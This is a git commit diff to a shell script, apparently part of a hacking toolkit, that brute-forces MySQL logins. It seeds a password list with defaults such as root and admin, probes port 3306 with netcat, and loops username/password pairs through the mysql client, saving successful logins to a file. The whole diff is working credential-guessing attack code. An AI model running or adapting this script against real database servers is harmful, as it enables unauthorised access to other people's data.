e3f0dd8d746b4c37a82bc61bb25211e2ed3ada94
bop-hack <97530647+bop-hack@users.noreply.github.com>
2022-01-20 19:34:32 +0100

    fixxed
    with netcat to check port and brute with mysql

--- lib/scan_mysql.sh
+++ lib/scan_mysql.sh
@@ -7,44 +7,47 @@ dicpass="./txt/mysql-pass.dic"
 dicuser="./txt/mysql-user.dic"
 
 if [[ ! -f "$dicuser" ]]; then
-	echo "root" > "$dicuser"
+    echo "root" > "$dicuser"
 fi
 
 if [[ ! -f "$dicpass" ]]; then
-	echo "root" > "$dicpass"
+    echo "root" > "$dicpass"
+    echo "admin" >> "$dicpass"
+    echo "su" >> "$dicpass"
+    echo "mysql" >> "$dicpass"
+fi
+
+echo "try: mysql://$HOSTNAME:3306"
+if ! nc -vz -w $TIMEOUT $HOSTNAME 3306; then
+    echo "mysql://$HOSTNAME offline"
+    exit
+else
+    echo "[found] mysql://$HOSTNAME" |grep --color ".*"
+    echo "$HOSTNAME:3306" >> found_mysql.txt
 fi
 
 cat "$dicuser" | while read user
 do
-	user=$(echo "$user" |tr -d "\n")
-	user=$(echo "$user" |xargs)
+    user=$(echo "$user" |tr -d "\n")
+    user=$(echo "$user" |xargs)
     if [ -z "$user" ]; then
-	   continue
+       continue
     fi
-	
-	cat "$dicpass" | while read passwd
-	do
-	   passwd=$(echo "$passwd" |tr -d "\n")
-	   passwd=$(echo "$passwd" |xargs)
-	   if [ -z "$passwd" ]; then
-		   continue
-	   fi
-	   echo "try: mysql://${user}:${passwd}@${HOSTNAME}"
-	   mysqlbf=$(mysql --connect-timeout=${TIMEOUT} -h"${HOSTNAME}" -u"${user}" -p"${passwd}" -e "show databases")
-	   #echo "$mysqlbf"
-	   if [[ $mysqlbf = *"Database"* ]]; then
-		   echo "[found] mysql://${user}:${passwd}@${HOSTNAME}"
-		   echo "${user}:${passwd}@${HOSTNAME}" >> "found_mysql.txt"
-	   fi
-	   sleep 1
-	   #~ ERROR 1045 (28000): Access denied for user
-	   if [[ "$mysqlbf" = *"Access denied for user"* ]]; then
-			continue
-		else
-			echo "[info] no mysqlserver: $HOSTNAME" |grep --color ".*"
-			break 3
-	   fi
-	   
-	done
+    
+    cat "$dicpass" | while read passwd
+    do
+        passwd=$(echo "$passwd" |tr -d "\n")
+        passwd=$(echo "$passwd" |xargs)
+        if [ -z "$passwd" ]; then
+           continue
+        fi
+        echo "try: mysql://${user}:${passwd}@${HOSTNAME}"
+        
+        if mysql --connect-timeout=${TIMEOUT} -h"${HOSTNAME}" -u"${user}" -p"${passwd}" -e "show databases"; then
+           echo "[found] mysql://${user}:${passwd}@${HOSTNAME}"
+           echo "${user}:${passwd}@${HOSTNAME}" >> "found_mysql_login.txt"
+        fi
+       
+    done
 done
 
